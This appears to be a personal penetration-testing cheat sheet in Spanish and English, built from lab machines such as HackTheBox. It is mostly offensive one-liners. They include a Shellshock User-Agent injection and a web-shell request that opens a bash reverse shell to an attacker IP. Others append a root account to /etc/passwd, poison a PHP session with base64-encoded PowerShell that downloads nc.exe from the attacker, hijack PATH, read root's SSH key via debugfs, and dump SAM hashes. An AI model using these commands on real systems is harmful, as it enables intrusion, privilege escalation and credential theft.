---
title: tips
category: varios
order: 1
---


# stderr y stdout
a veces los comandos por ejemplo en shellshock salen por stderr asi que tenemos que redireccionar stdout a stderr ex:
```
root@kali:~# curl -H "User-Agent: () { :; }; /bin/bash -c 'echo aaaa; nc  -h 2>&1; echo zzzz;'" http://10.11.1.71/cgi-bin/admin.cgi -s \
```

# unzip with python
```
#!/usr/bin/env python3
import sys
from zipfile import PyZipFile
for zip_file in sys.argv[1:]:
    pzf = PyZipFile(zip_file)
    pzf.extractall()
```

# urlencode webshell request with curl
```
curl -X POST http://10.10.10.143/pwned.php --data-urlencode ​ 'exec=bash -c "bash -i >& /dev/tcp/10.10.14.4/1234 0>&1"'
```

# run bash commands from powershell (wut)
```
PS C:\windows> bash -c "command"
```

# FTP
bajar archivos con tipo binario porque los rompe sino
```
ftp> type binary
ftp> get backup.mdb
```

# powershell hidden files  
```
dir -Force
```
# data stream
```
dir /R
hm.txt:root.txt:$DATA
```
```
​powershell Get-Content -Path "hm.txt" -Stream "root.txt"
```
```
more < hm.txt:root.txt
```

# rdp
```
rdesktop -g 85% -r disk:share=/var/www -r clipboard:CLIPBOARD -u username -p password 10.10.10.10
```

# if can run as sudo but dont have shell
```
echo 'toor:aaKNIEDOaueR6:0:0:toor:/root:/bin/bash' >> /etc/passwd
```
It will create a new root user with the password “foo”. The encrypted password was generated with: perl -le 'print crypt("foo", "aa")'. You can then easily elevate to a root shell with su toor.

```
localgroup Administrators offsec /add
```
this only work for old windows in modern execute a reverse shell might be the best idea


# clean carriage return from scripts
```
sed -i -e ‘s/\r$//’ <script name>
```

# steghide steganofrafia
usalo para sacar por ejemplo ssh que esten en una imagen
```
steghide extract -sf archivo.png
```


# pading oracle attack

# suid
si no tiene full path en sudo -l podemos hijackearlo cambiando el path

Because a full path to the cat binary is not specified, this specific command is vulnerable to
hijacking by modifying the ​ PATH​ system variable. This can be achieved by setting the working
directory as the first option in PATH, with the command ​ export PATH=.:$PATH
After this, creating a file named ​ cat​ in the working directory will cause the file to be executed by
the root user. In this case, a bash script will do the trick. Note, do not use the ​ cat​ command in the
script as this will cause the script to loop endlessly. Don’t forget to ​ chmod +x ./cat​ before running
the backup binary. The script below creates a copy of the root flag in the home directory.


# IPV6 ?



# unix wildcards
https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt

# windows php cookies
PHP stores the session files in C:\Windows\TEMP in the format sess_<cookie> . In order to read
our session file we will use the session ID we acquired. In this case the session file would be
sess_923nktm0vmmi12qrptls332t5o . Let's see if we can read it
Replace everything after sess_ with your own cookie value.
```
curl -X GET http://10.10.10.151/blog/?
lang=/windows/temp/sess_923nktm0vmmi12qrptls332t5o
```
f we can create a username containing PHP code, we could potentially gain RCE. Consider the
following as a username.
```
<?=`powershell whoami`?>
```

## bypass blacklisting chars
```
echo "wget http://10.10.14.23/nc.exe -o C:\\Windows\\TEMP\\nc.exe" | iconv -t
UTF-16LE | base64
```
```
<?=`powershell /enc
dwBnAGUAdAAgAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMgAzAC8AbgBjAC4AZQB4AGUA
IAAtAG8AIABDADoAXABXAGkAbgBkAG8AdwBzAFwAVABFAE0AUABcAG4AYwAuAGUAeABlAAoA`?>
```


# procdump


# express using jwt token
* get the token
```
curl -s -X POST  http://10.10.10.137:3000/login -d "username=admin&password=pas111223" | jq
```

* use the token
```
curl -s http://10.10.10.137:3000/ -H ​ 'Authorization: Bearer
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNT
U4ODU1NTYzLCJleHAiOjE1NTg5NDE5NjN9.s7ZbrqwW--H6Ae-UWs3VeO21U2XRwfNEDeL0gAYI
pX0'​ | jq
```


# INODES
if you own the directory but not the file, you can move it and create another one with the same name

# disk permision
if you have disk permission you can use
```
debugfs /dev/sda1
debugfs: cat /root/.ssh/id_rsa
```
# powershell thruogh ftp when restricted
```
 echo !powershell.exe > ftpcommands.txt && ftp -s:ftpcommands.txt
 ```
# weird dependencies location
for example :
As gcc is not available on the target machine, the exploit must be compiled locally. LinEnum
previously identified ​ /home/decoder/test​ as world-writable and can be used to drop the binary.
Attempting to run the exploit without modification will fail as the target is missing ​ /etc/lsb-release​ .
Simply changing references of ​ /etc/lsb-release​ to ​ /home/decoder/test/lsb-release​ is sufficient.


# DUMP HASHES
reg save hklm\sam c:\sam
reg save hklm\system c:\system
python /usr/share/doc/python-impacket/examples/secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
